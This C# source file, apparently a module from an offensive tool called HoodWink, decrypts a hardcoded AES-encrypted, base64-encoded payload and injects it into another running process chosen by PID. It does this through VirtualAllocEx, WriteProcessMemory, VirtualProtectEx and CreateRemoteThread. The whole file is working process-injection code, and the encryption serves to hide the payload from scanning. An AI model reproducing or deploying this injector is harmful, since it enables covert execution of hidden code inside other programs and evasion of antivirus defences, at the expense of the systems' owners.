
using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace HoodWink.ModuleSource
{
    class Remote_CreateRemoteThread
    {
        // to allocate mem
        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

        // to run delegate as unmanaged code
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate void WindowsRun();

        public static void Main(string[] args)
        {
            string b64 = "qJe+upLFXdCnzB+llUxPo+FMwMaiobkipmX4vIgZqA6FK2ZHwFwCvBBblPvyfbMJW8WqVU5B7vWRpTQPjKZR6UqyD1R1jSiOnJIVpB1gKNaaJQb5WDQ2t4Gt4RN6oQTRsd3USxjjVFojEVNCvKiorSOHKMkIJyqsleybTzv6OuMZmEgCsQcq8+JOi1/VQBmAKd3Y+7N6utEtqiIiwVEMsFLBmS1kIqe8nTyVjjthmB2aC20uEFMymjpGaAvrah31tEsl0e0bthbp/TW46W71/LefoqeNV61VuPvWMWiBAU52Hqvr1sdLYxkkh//OFQh7Qqa0wUNVgg9RrkKfYuVWBix4RV75/ZGA8TQGgDay8nQF52rM+sh45MTood5hMB/r";
            string key = "bBtn8JkTVvI93mwdr6lkHED6XFjt7jadFNxBBSSXkbo=";
            string iv = "i0e967YMFjn08ByQxmU6JQ==";

            byte[] payload = Decrypt(b64, key, iv);

            int pid = int.Parse(args[0]); // No Cheking on arg
            var target = Process.GetProcessById(pid);
            var baseAddress = Util.Kernel32.VirtualAllocEx(target.Handle,
                    IntPtr.Zero,
                    payload.Length,
                    Util.Kernel32.AllocationType.Commit | Util.Kernel32.AllocationType.Reserve,
                    Util.Kernel32.MemoryProtection.ReadWrite);

            Util.Kernel32.WriteProcessMemory(
                target.Handle,
                baseAddress,
                payload,
                payload.Length,
                out _);

            Util.Kernel32.VirtualProtectEx(
                target.Handle,
                baseAddress,
                payload.Length,
                Util.Kernel32.MemoryProtection.ExecuteRead,
                out _);

            Util.Kernel32.CreateRemoteThread(
                target.Handle,
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                out var threadId);

            // return threadId != IntPtr.Zero;
        }


        private static byte[] Decrypt(string dataBase64, string keyBase64, string ivBase64)
        {
            using (Aes aes = Aes.Create())
            {
                // Decode data
                byte[] data = Convert.FromBase64String(dataBase64);

                // Set Key and IV
                aes.Key = Convert.FromBase64String(keyBase64);
                aes.IV = Convert.FromBase64String(ivBase64);

                // Console.WriteLine($"Aes Cipher Mode : {aes.Mode}");
                // Console.WriteLine($"Aes Padding Mode: {aes.Padding}");
                // Console.WriteLine($"Aes Key Size :    {aes.KeySize}");
                // Console.WriteLine($"Aes Block Size :  {aes.BlockSize}");
                // Console.WriteLine();

                // Create decrypter and run
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return DoCrypto(data, decryptor);
                }
            }
        }

        // Do Encryption/Decryption on data with provided crypter
        private static byte[] DoCrypto(byte[] data, ICryptoTransform crypter)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, crypter, CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();

                    return ms.ToArray();
                }
            }
        }

    }
}